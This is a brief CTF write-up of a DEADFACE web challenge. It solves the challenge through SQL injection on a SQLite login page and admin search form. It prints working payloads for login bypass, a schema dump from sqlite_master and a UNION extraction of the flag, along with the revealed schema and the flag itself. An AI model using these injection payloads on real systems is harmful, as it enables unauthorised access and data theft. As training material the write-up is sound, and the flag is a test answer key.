> [!abstract] Challenge Description
> > @3.14ro
> ## 100
> DEADFACE is taunting us! We found their link! There was a breach!. How deep, and how for heaven’s sakes did they got in, we don’t know! Can you locate the flag?
> 
> Submit the flag as `deadface{text}`.
> 
> [https://deadface-db01.chals.io](https://deadface-db01.chals.io/)

Brings us to simple login page.
Executing `admin' OR 1=1 --` gets us to the admin page.

From here, we can search users for specific things.
> [!info] Admin Dashboard
> ![[SQLite007 Admin Dashboard.png]]

Again, executing `' OR 1=1--` will give us all the results for that specific topic.
No results. Perhaps we can infiltrate the database.

Using `' UNION SELECT sql,NULL,NULL,NULL,NULL FROM sqlite_master--` (since its sqlite), shows us the tables.

```SQLite
None, None, None, None, None  
CREATE TABLE activity_logs ( log_id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, action TEXT, timestamp TEXT, details TEXT ), None, None, None, None  
CREATE TABLE api_keys ( key_id TEXT PRIMARY KEY, user_id TEXT, api_key TEXT, scopes TEXT, created_at TEXT, revoked INTEGER DEFAULT 0 ), None, None, None, None  
CREATE TABLE general (flag TEXT), None, None, None, None  
CREATE TABLE profiles ( user_id TEXT PRIMARY KEY, username TEXT, full_name TEXT, email TEXT, bio TEXT, created_at TEXT ), None, None, None, None  
CREATE TABLE sessions ( session_id TEXT PRIMARY KEY, user_id TEXT, created_at TEXT, expires_at TEXT, client_ip TEXT, user_agent TEXT ), None, None, None, None  
CREATE TABLE sqlite_sequence(name,seq), None, None, None, None
```

Hence the final command to get the flag is 
`' UNION SELECT flag,NULL,NULL,NULL,NULL FROM general--`

---
> [!success] Flag: `deadface{you_found_the_sqli_01_flag!}`
